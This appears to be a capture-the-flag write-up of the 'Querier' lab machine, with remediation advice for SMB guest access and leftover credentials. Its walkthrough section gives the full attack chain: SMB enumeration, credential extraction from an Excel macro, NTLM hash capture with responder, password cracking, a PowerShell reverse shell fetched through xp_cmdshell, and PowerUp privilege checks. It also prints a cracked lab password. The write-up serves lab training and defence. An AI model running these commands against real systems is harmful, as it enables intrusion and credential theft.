# Security Remediation Plan

## Identified Security Vulnerabilities

The primary security vulnerabilities identified stem from two key issues:

- **Unauthorized Guest Access:** Improper configuration of access controls allowing guest users to log on to the SMB share "REPORTS."
- **Insufficient File Cleanup:** Failure of local administrators and users to properly clean up sensitive files, resulting in the retention of login credentials within Excel macros and configuration files for unattended installations.

These vulnerabilities pose a significant risk, as they could potentially expose critical authentication data to unauthorized individuals, increasing the likelihood of unauthorized access and exploitation of the network.

## Recommended Remediation Steps

To effectively remediate these issues, the following steps should be taken:

1. **System Scrubbing:** Conduct a thorough review and cleanup of the system to identify and remove any leftover configuration files associated with unattended installations. This ensures no sensitive data remains within the system.

2. **Disable Guest Access to SMB Shares:** Immediately disable guest access to the SMB share "REPORTS" to prevent unauthorized users from gaining access to sensitive information.

3. **Establish Strong Policies:** Implement and enforce strict policies for both users and administrators, explicitly prohibiting the storage of passwords in clear text locally. Educate staff on secure password management practices and implement technical controls to minimize the risk of sensitive data being exposed.

By addressing these points, the system will be better secured and the risk of unauthorized access or data breaches significantly reduced.

## Guides

<details>
  <summary>Steps to Recreate Compromise</summary>
  
# Recreating the Compromise

## Step 1: Reconnaissance

Using the following commands, I was able to get information on the open ports and then moved to see if there were any public-facing SMB shares.

nmap -sV -sS -A 10.129.156.234

Please see below for a screenshot of the output of the commands.
![nmap output](https://github.com/Miner221272/Writeups/blob/main/Medium/Querier/screenshots/nmap.png)

Next, we moved to see if there were any shares available.

smbclient -N -L \\\\\\\\10.129.156.234

Please see below for a screenshot of the output of the commands.
![smb shares](https://github.com/Miner221272/Writeups/blob/main/Medium/Querier/screenshots/smb_enumeration.png)

## Step 2: Initial Access

Through the above reconnaissance we were able to identify the "Reports" share
We can test if this share allows guest logon through the following
smbclient -N \\\\\\\\10.129.156.234\\\\Reports
This will succeed and by using the "ls" command we can see that 

"Currency Volume Report.xlsm" is saved here
![smb vuln file](https://github.com/Miner221272/Writeups/blob/main/Medium/Querier/screenshots/smb_available_file.png)

use the following command to save this file locally.

get "Currency Volume Report.xlsm"

The "m" in ".xlsm" means there are macros enabled.
We will next unzip the file with the "unzip" command.
Once it is unzipped use the following command to gain access to our first set of compromised credentials.

head xl/vbaProject.bin | strings
![first creds gathered](https://github.com/Miner221272/Writeups/blob/main/Medium/Querier/screenshots/Initial_creds_comp.png)

## Step 3: Privilege Escalation  

Before you move forward with this section we will need a few tools

- johntheripper
- impacket-mssqlclient
- impacket-psexec
- netcat
- python3 http.server
- responder

the first thing we will be doing is getting 2 terminal windows open. Please pay attention because we will be jumping between the 2 throughout this section.
We will track which we are in with one terminal being labeled "Term 1" and the other being "Term 2".

Term 1: Log into the system with the following command:
impacket-mssqlclient reporting:@10.129.156.234 -windows-auth

Term 2:
Use the following command to setup our listener:

responder -I [YOUR INTERFACE CONNECTED TO THE NETWORK WITH THE VULNERABLE BOX]

Information can be found using "ip addr show"

Term 1:
Next we will send the hashes from the SQL Service with the following command:

xp_dirtree '\\\\[YOUR LOCAL IP]\share\file'

Now you should have been able to gather the hashes on term 2. Please see below for the full output.

![privilege Esc](https://github.com/Miner221272/Writeups/blob/main/Medium/Querier/screenshots/responder_cred_grab.png)

Next we will take that hash and put it into johntheripper and have the following credentials recovered:

john password_hash -w=/usr/share/wordlist/rockyou.txt

mssql-svc:corporate568

now login with those credentials using:

impacket-mssqlclient mssql-svc:@10.129.156.234 -windows-auth

next on our local machine we will set up a listener with netcat, and a webserver using python3.

Python3 server will be hosting 2 files
- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1

For the first one you will add the following line to the end:

Invoke-PowerShellTcp -Reverse -IPAddress YOUR_LOCAL_IP -Port PORT_CHOSEN

For the second link you will add the following to the end of the script:

Invoke-AllChecks

Next create 2 terminals locally and do the following:
Term 1: python3 -m http.server 80
Term 2: nc -lvnp PORT_CHOSEN

now back on the terminal connected to our target input the following:

xp_cmdshell powershell iex(new-object net.webclient).downloadstring(\"http://YOUR_LOCAL_IP/Invoke-PowerShellTcp.ps1\")

You now have a shell on your netcat listener.

Next type in the following to your shell:

iex(new-object net.webclient).downloadstring("http://10.10.16.2/PowerUp.ps1")

this will give the following output:

![privilege Esc](https://github.com/Miner221272/Writeups/blob/main/Medium/Querier/screenshots/admin_cred_grab.png)


</details>

<details>
  <summary>SMB Guest Access Lockdown</summary>
  
  1. **Step 1:** Disable guest access to the SMB share by adjusting the appropriate access control settings on the server.
  2. **Step 2:** Review and confirm that only authorized users and groups have access to the share.
  3. **Step 3:** Ensure the system is configured to prevent guest access in the future by disabling guest accounts or limiting permissions.
  4. **Step 4:** Document the updated access control configuration and test to confirm restrictions are enforced.

</details>

